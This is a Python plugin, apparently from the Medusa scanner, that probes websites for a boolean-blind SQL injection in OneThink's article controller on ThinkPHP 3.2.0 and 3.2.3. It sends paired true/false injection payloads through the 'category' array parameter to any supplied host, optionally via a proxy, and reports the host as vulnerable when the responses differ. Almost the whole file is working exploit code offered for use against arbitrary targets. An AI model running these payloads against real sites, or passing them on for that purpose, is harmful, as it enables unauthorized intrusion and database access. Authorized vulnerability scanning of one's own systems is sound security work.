#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Onethink 参数category SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2016-0176868
author: Ascotbe
reference: Lucifer
description: onethink是ThinkPHP的子版本的一种，漏洞位于Application/Home/Controller/ArticleController.class.php中,category数组存在bool型盲注入,
    影响版本ThinkPHP 3.2.0和3.2.3
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payloads = ["/index.php?c=article&a=index&category[0]==0))+and+1=1%23between&category[1]=a",
            "/index.php?c=article&a=index&category[0]==0))+and+1=2%23between&category[1]=a"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        reqlst = []
        for payload in payloads:
            payload_url = scheme+"://"+url+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
                reqlst.append(str( resp.text))
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
                reqlst.append(str(resp.text))
            con = resp.text
            code = resp.status_code
            if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]:
                Medusa = "{} 存在onethink3.2.0 SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    try:
        payloads2 = ["/index.php?c=article&a=index&category[0]==0+and+1=1%23between&category[1]=a",
                    "/index.php?c=article&a=index&category[0]==0+and+1=2%23between&category[1]=a"]
        reqlst2 = []
        for payload in payloads2:
            payload_url = scheme+"://"+url+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
                reqlst2.append(str( resp.text))
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
                reqlst2.append(str(resp.text))
            con = resp.text
            code = resp.status_code
            if len(reqlst2[0]) != len(reqlst2[1]) and r"分类不存在或被禁用" in reqlst2[1]:
                Medusa = "{} 存在onethink3.2.0 SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas